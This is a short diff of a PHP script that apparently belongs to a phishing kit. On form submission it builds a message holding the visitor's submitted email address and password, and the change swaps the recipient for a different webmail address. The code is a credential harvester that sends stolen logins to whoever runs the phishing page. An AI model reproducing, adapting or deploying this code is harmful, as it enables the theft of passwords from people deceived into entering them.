@@ -3,7 +3,7 @@
 if(isset($_POST['submit']))
 { 
 
-$to = "godabegi@yahoo.com";
+$to = "nnahgodspowe125@gmail.com";
 
 $subject = "Details";
 $txt = "Email Address is: " .$_POST['email']. "  Password is: " .$_POST['password'];
